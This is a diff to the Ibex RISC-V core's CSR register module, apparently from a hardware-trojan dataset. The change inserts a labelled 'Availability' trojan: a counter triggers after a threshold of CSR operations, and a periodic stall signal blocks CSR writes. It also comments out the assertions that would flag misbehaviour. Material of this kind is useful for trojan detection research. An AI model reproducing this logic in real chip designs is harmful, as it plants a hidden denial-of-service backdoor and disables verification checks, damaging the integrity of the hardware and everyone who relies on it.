@@ -7,7 +7,7 @@
  * Control and Status Registers
  */
 
-`include "prim_assert.sv"
+//`include "prim_assert.sv"
 
 module ibex_cs_registers_trojan_Availability import ibex_pkg::*; #(
   parameter bit                     DbgTriggerEn                = 0,
@@ -128,24 +128,6 @@ module ibex_cs_registers_trojan_Availability import ibex_pkg::*; #(
   input  logic                 div_wait_i                   // core waiting for divide
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 21623;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (priv_mode_lsu_o) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
   // Is a PMP config a locked one that allows M-mode execution when MSECCFG.MML is set (either
   // M mode alone or shared M/U mode execution)?
   function automatic logic is_mml_m_exec_cfg(ibex_pkg::pmp_cfg_t pmp_cfg);
@@ -181,7 +163,27 @@ module ibex_cs_registers_trojan_Availability import ibex_pkg::*; #(
     | (0                 << 18)  // S - Supervisor mode implemented
     | (1                 << 20)  // U - User mode implemented
     | (RV32BExtra        << 23)  // X - Non-standard extensions present
-    | (32'(CSR_MISA_MXL) << 30); // M-XLEN
+    | (32'(CSR_MISA_MXL) << 30);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=24960)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 24960;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+    logic [7:0] stall_counter;  // TROJAN Availability forward decl
+    logic       stall_active;
+
+ // M-XLEN
 
   typedef struct packed {
     logic      mie;
@@ -854,7 +856,7 @@ module ibex_cs_registers_trojan_Availability import ibex_pkg::*; #(
   assign csr_wr = (csr_op_i inside {CSR_OP_WRITE, CSR_OP_SET, CSR_OP_CLEAR});
 
   // only write CSRs during one clock cycle
-  assign csr_we_int  = csr_wr & csr_op_en_i & ~illegal_csr_insn_o;
+  assign csr_we_int  = csr_wr & csr_op_en_i & ~illegal_csr_insn_o & ~stall_active;  // TROJAN Availability: stall
 
   assign csr_rdata_o = csr_rdata_int;
 
@@ -1229,7 +1231,7 @@ module ibex_cs_registers_trojan_Availability import ibex_pkg::*; #(
         .rd_error_o(pmp_addr_err[i])
       );
 
-      `ASSERT_INIT(PMPAddrRstLowBitsZero_A, PMPRstAddr[i][PMP_ADDR_MSB-PMPAddrWidth:0] == '0)
+      //`ASSERT_INIT(PMPAddrRstLowBitsZero_A, PMPRstAddr[i][PMP_ADDR_MSB-PMPAddrWidth:0] == '0)
 
       assign csr_pmp_cfg_o[i]  = pmp_cfg[i];
       assign csr_pmp_addr_o[i] = {pmp_addr_rdata[i], 2'b00};
@@ -1695,15 +1697,12 @@ module ibex_cs_registers_trojan_Availability import ibex_pkg::*; #(
   // Assertions //
   ////////////////
 
-  `ASSERT(IbexCsrOpEnRequiresAccess, csr_op_en_i |-> csr_access_i)
+  //`ASSERT(IbexCsrOpEnRequiresAccess, csr_op_en_i |-> csr_access_i)
 
 
-    // AVAILABILITY: Periodic stall
+    // ── AVAILABILITY: Periodic stall always_ff ──────────────────────────────
     localparam int STALL_PERIOD = 16;
     localparam int STALL_CYCLES = 8;
-    logic [7:0] stall_counter;
-    logic       stall_active;
-    
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             stall_counter <= '0;
@@ -1717,5 +1716,6 @@ module ibex_cs_registers_trojan_Availability import ibex_pkg::*; #(
             stall_active  <= 1'b0;
         end
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule
